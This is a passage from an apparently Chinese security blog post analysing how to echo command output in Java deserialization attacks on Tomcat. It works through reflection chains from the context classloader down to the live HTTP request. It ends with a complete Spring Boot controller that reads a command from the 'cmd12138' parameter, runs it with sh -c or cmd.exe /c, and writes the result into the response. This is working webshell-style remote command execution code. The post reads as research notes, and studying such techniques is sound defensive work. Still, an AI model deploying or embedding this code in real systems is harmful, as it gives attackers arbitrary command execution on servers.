<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201223174205164.png" alt="image-20201223174205164"></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">org.apache.catalina.connector.Connector connectors[]=standardService.findConnectors();</span><br></pre></td></tr></table></figure>

<p>​        遍历connectors，通过connector的getProtocolHandler方法获取protocolHandler,再通过protocolHandler的getHandler获取connectoinHandler。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> org.apache.coyote.ProtocolHandler protocolHandler = connectors[i].getProtocolHandler();</span><br><span class="line"></span><br><span class="line">java.lang.reflect.Method getHandlerMethod = org.apache.coyote.AbstractProtocol.class.getDeclaredMethod("getHandler",null);</span><br><span class="line">getHandlerMethod.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line"> org.apache.tomcat.util.net.AbstractEndpoint.Handler connectoinHandler= (org.apache.tomcat.util.net.AbstractEndpoint.Handler) getHandlerMethod.invoke(protocolHandler,<span class="keyword">null</span>);</span><br></pre></td></tr></table></figure>

<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201223175015493.png" alt="image-20201223175015493"></p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201223175429390.png" alt="image-20201223175429390"></p>
<p>​        下面需要从ConnectionHandler中取出global中的内容</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">java.lang.reflect.Field globalField = Class.forName(<span class="string">"org.apache.coyote.AbstractProtocol$ConnectionHandler"</span>).getDeclaredField(<span class="string">"global"</span>);</span><br><span class="line"></span><br><span class="line">globalField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">org.apache.coyote.RequestGroupInfo requestGroupInfo = (org.apache.coyote.RequestGroupInfo) globalField.get(connectoinHandler);</span><br></pre></td></tr></table></figure>

<p>​        再从global中取出processors对象，里面包含了RequestInfo数组</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201223180014242.png" alt="image-20201223180014242"></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">java.lang.reflect.Field processorsField = org.apache.coyote.RequestGroupInfo.class.getDeclaredField("processors");</span><br><span class="line">processorsField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">java.util.List list = (java.util.List) processorsField.get(requestGroupInfo);</span><br></pre></td></tr></table></figure>

<p>​        由于获取到的Processors是一个ArrayList列表，所以我们需要遍历这个列表出去RequestInfo对象，获取到RequestInfo对象后需要判断当前的RequestInfo是否为我们本次请求的。可以通过是否包含我们需要的参数来进行判断。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">requestInfo.getCurrentQueryString().contains(<span class="string">"xxxx"</span>)</span><br></pre></td></tr></table></figure>

<p>​        跟进getCurrentQueryString，调用this.req.queryString方法，在queryString中返回我们传入的参数和内容。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201223181123439.png" alt="image-20201223181123439"></p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201223181134400.png" alt="image-20201223181134400"></p>
<p>​        找到我们本次请求的requestInfo后，我们需要获取request对象，而requestInfo.req属性中保存了当前的request对象，所以我们只要通过反射调用获取到req属性的内容即可。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201223181335226.png" alt="image-20201223181335226"></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">java.lang.reflect.Field requestField = org.apache.coyote.RequestInfo.class.getDeclaredField("req");</span><br><span class="line">requestField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">org.apache.coyote.Request tempRequest = (org.apache.coyote.Request) requestField.get(requestInfo);  <span class="comment">//获取request对象，这个对象是coyote类型的，和我们平时使用的Request不太一样</span></span><br><span class="line">org.apache.catalina.connector.Request request = (org.apache.catalina.connector.Request) tempRequest.getNote(<span class="number">1</span>); <span class="comment">//通过getNote方法获取org.apache.catalina.connector.Request对象</span></span><br></pre></td></tr></table></figure>

<p>​            在request中保存的对象为coyote.request类型</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201223200125355.png" alt="image-20201223200125355"></p>
<p>​            通过request.getNote获取org.apache.catalina.connector.Request对象</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201223200553783.png" alt="image-20201223200553783"></p>
<p>​            在org.apache.catalina.connector.Request中可以获取HttpServletRequest和HttpServletResponse对象。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201223201314166.png" alt="image-20201223201314166"></p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201223201323147.png" alt="image-20201223201323147"></p>
<p>​        最后我们获取request对象，并获取我们要执行的命令，再获取response对象，将命令执行的结果写入到Response对象中。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">String cmd =request.getParameter(pass);</span><br><span class="line">String[] cmds = !System.getProperty(<span class="string">"os.name"</span>).toLowerCase().contains(<span class="string">"win"</span>) ? <span class="keyword">new</span> String[]&#123;<span class="string">"sh"</span>, <span class="string">"-c"</span>, cmd&#125; : <span class="keyword">new</span> String[]&#123;<span class="string">"cmd.exe"</span>, <span class="string">"/c"</span>, cmd&#125;;</span><br><span class="line">java.io.InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">java.util.Scanner s = <span class="keyword">new</span> java.util.Scanner(in).useDelimiter(<span class="string">"\\a"</span>);</span><br><span class="line">String output = s.hasNext() ? s.next() : <span class="string">""</span>;</span><br><span class="line">java.io.Writer writer = request.getResponse().getWriter();</span><br><span class="line">java.lang.reflect.Field usingWriter = request.getResponse().getClass().getDeclaredField(<span class="string">"usingWriter"</span>);</span><br><span class="line">usingWriter.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">usingWriter.set(request.getResponse(), Boolean.FALSE);</span><br><span class="line">writer.write(output);</span><br><span class="line">writer.flush();</span><br></pre></td></tr></table></figure>

<p>​        整个过程分析结束了，最后给出spring-boot下的完整代码</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.connector.Response;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.connector.ResponseFacade;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.ApplicationFilterChain;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.loader.WebappClassLoaderBase;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletResponse;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"><span class="keyword">import</span> java.io.Writer;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Modifier;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloController</span> </span>&#123;</span><br><span class="line">    <span class="meta">@RequestMapping</span>(<span class="string">"/test"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">index</span><span class="params">(String input,HttpServletResponse resp)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException </span>&#123;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="comment">//传递命令的参数名</span></span><br><span class="line">            String pass=<span class="string">"cmd12138"</span>;</span><br><span class="line"></span><br><span class="line">            <span class="comment">//WebappClassLoaderBase</span></span><br><span class="line">            org.springframework.boot.web.embedded.tomcat.TomcatEmbeddedWebappClassLoader webappClassLoaderBase =(org.springframework.boot.web.embedded.tomcat.TomcatEmbeddedWebappClassLoader) Thread.currentThread().getContextClassLoader();</span><br><span class="line">            <span class="comment">//ApplicationContext</span></span><br><span class="line">            org.apache.catalina.Context context=webappClassLoaderBase.getResources().getContext();</span><br><span class="line">            java.lang.reflect.Field contextField = org.apache.catalina.core.StandardContext.class.getDeclaredField("context");</span><br><span class="line">            contextField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            org.apache.catalina.core.ApplicationContext applicationContext = (org.apache.catalina.core.ApplicationContext) contextField.get(context);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//StandardService</span></span><br><span class="line">            java.lang.reflect.Field serviceField = org.apache.catalina.core.ApplicationContext.class.getDeclaredField("service");</span><br><span class="line">            serviceField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            org.apache.catalina.core.StandardService standardService = (org.apache.catalina.core.StandardService) serviceField.get(applicationContext);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//Connector</span></span><br><span class="line">            org.apache.catalina.connector.Connector connectors[]=standardService.findConnectors();</span><br><span class="line"></span><br><span class="line">            <span class="comment">//筛选Connector</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;connectors.length;i++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (connectors[i].getScheme().contains(<span class="string">"http"</span>)) &#123;</span><br><span class="line"></span><br><span class="line">                    <span class="comment">//AbstractProtocol$ConnectoinHandler</span></span><br><span class="line">                    org.apache.coyote.ProtocolHandler protocolHandler = connectors[i].getProtocolHandler();</span><br><span class="line">                    java.lang.reflect.Method getHandlerMethod = org.apache.coyote.AbstractProtocol.class.getDeclaredMethod("getHandler",null);</span><br><span class="line">                    getHandlerMethod.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                    org.apache.tomcat.util.net.AbstractEndpoint.Handler connectoinHandler= (org.apache.tomcat.util.net.AbstractEndpoint.Handler) getHandlerMethod.invoke(protocolHandler,<span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">                    <span class="comment">//RequestGroupInfo</span></span><br><span class="line">                    java.lang.reflect.Field globalField = Class.forName(<span class="string">"org.apache.coyote.AbstractProtocol$ConnectionHandler"</span>).getDeclaredField(<span class="string">"global"</span>);</span><br><span class="line">                    globalField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                    org.apache.coyote.RequestGroupInfo requestGroupInfo = (org.apache.coyote.RequestGroupInfo) globalField.get(connectoinHandler);</span><br><span class="line"></span><br><span class="line">                    <span class="comment">//获取RequestGroupInfo中储存了RequestInfo的processors</span></span><br><span class="line">                    java.lang.reflect.Field processorsField = org.apache.coyote.RequestGroupInfo.class.getDeclaredField("processors");</span><br><span class="line">                    processorsField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                    java.util.List list = (java.util.List) processorsField.get(requestGroupInfo);</span><br><span class="line"></span><br><span class="line">                    <span class="comment">//通过QueryString筛选</span></span><br><span class="line">                    <span class="keyword">for</span> (<span class="keyword">int</span> k = <span class="number">0</span>; k &lt; list.size(); k++) &#123;</span><br><span class="line">                        org.apache.coyote.RequestInfo requestInfo= (org.apache.coyote.RequestInfo) list.get(k);</span><br><span class="line">                        <span class="keyword">if</span>(requestInfo.getCurrentQueryString().contains(pass))&#123;</span><br><span class="line"></span><br><span class="line">                            <span class="comment">//request</span></span><br><span class="line">                            java.lang.reflect.Field requestField = org.apache.coyote.RequestInfo.class.getDeclaredField("req");</span><br><span class="line">                            requestField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                            org.apache.coyote.Request tempRequest = (org.apache.coyote.Request) requestField.get(requestInfo);</span><br><span class="line">                            org.apache.catalina.connector.Request request = (org.apache.catalina.connector.Request) tempRequest.getNote(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">                            <span class="comment">//执行命令并回显</span></span><br><span class="line">                            String cmd =request.getParameter(pass);</span><br><span class="line">                            String[] cmds = !System.getProperty(<span class="string">"os.name"</span>).toLowerCase().contains(<span class="string">"win"</span>) ? <span class="keyword">new</span> String[]&#123;<span class="string">"sh"</span>, <span class="string">"-c"</span>, cmd&#125; : <span class="keyword">new</span> String[]&#123;<span class="string">"cmd.exe"</span>, <span class="string">"/c"</span>, cmd&#125;;</span><br><span class="line">                            java.io.InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">                            java.util.Scanner s = <span class="keyword">new</span> java.util.Scanner(in).useDelimiter(<span class="string">"\\a"</span>);</span><br><span class="line">                            String output = s.hasNext() ? s.next() : <span class="string">""</span>;</span><br><span class="line">                            java.io.Writer writer = request.getResponse().getWriter();</span><br><span class="line">                            java.lang.reflect.Field usingWriter = request.getResponse().getClass().getDeclaredField(<span class="string">"usingWriter"</span>);</span><br><span class="line">                            usingWriter.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                            usingWriter.set(request.getResponse(), Boolean.FALSE);</span><br><span class="line">                            writer.write(output);</span><br><span class="line">                            writer.flush();</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>​        目前分析的这些回显方案总的来讲分为如下两种思路</p>
<ul>
<li>通过defineClass类似的方法加载远程或者本地的字节码执行命令，并将命令执行的结果通过异常显示。</li>
<li>通过某种方法获取请求的响应包，将命令执行的结果写入到响应包中。</li>
</ul>
<p>​        在本次了解JAVA反序列化回显方案中，还是发现了很多知识点的不清晰，深深感到自己知识功底不扎实，Linux和Windows的回显方案也依赖对于Socket的理解上，Tomcat的回显又依赖于对tomcat源码的了解上，如果没有这些基础，是很难自己挖掘到这种回显方法的。</p>
<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://l3yx.github.io/2020/03/31/Java-Web%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%9B%9E%E6%98%BE%E6%80%BB%E7%BB%93/#%E8%8E%B7%E5%8F%96Tomcat-Response" target="_blank" rel="noopener">java Web代码执行漏洞回显总结</a></p>
<p><a href="https://github.com/feihong-cs/Java-Rce-Echo" target="_blank" rel="noopener">Java RCE 回显</a></p>
<p><a href="https://xz.aliyun.com/t/7740#toc-4" target="_blank" rel="noopener">Java 反序列化回显的多种姿势</a></p>
<p><a href="https://xz.aliyun.com/t/7388#toc-1" target="_blank" rel="noopener">基于tomcat的内存 Webshell 无文件攻击技术</a></p>
<p><a href="https://mp.weixin.qq.com/s?__biz=MzIwNDA2NDk5OQ==&mid=2651374294&idx=3&sn=82d050ca7268bdb7bcf7ff7ff293d7b3" target="_blank" rel="noopener">基于全局储存的新思路 | Tomcat的一种通用回显方法研究</a></p>
<p><a href="https://xz.aliyun.com/t/7228" target="_blank" rel="noopener">Weblogic使用ClassLoader和RMI来回显命令执行结果</a></p>

      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    
      

    <span class="post-categories">
      <i class="icon-categories"></i>
        <a href="/categories/代码审计/">代码审计</a>
    </span>
    

    
    

    <span class="post-tags">
      <i class="icon-tags"></i>
        <a href="/tags/JAVA/">JAVA</a><a href="/tags/代码审计/">代码审计</a>
    </span>
    

    </div>

    
  </div>
</article>

  






    </main>

    <footer class="site-footer">
  <p class="site-info">
    Proudly powered by <a href="https://hexo.io/" target="_blank">Hexo</a> and
    Theme by <a href="https://github.com/CodeDaraW/Hacker" target="_blank">Hacker</a>
    </br>
    
    &copy; 2021 藏青
    
  </p>
</footer>
    
    
  </div>
</div>
</body>
</html>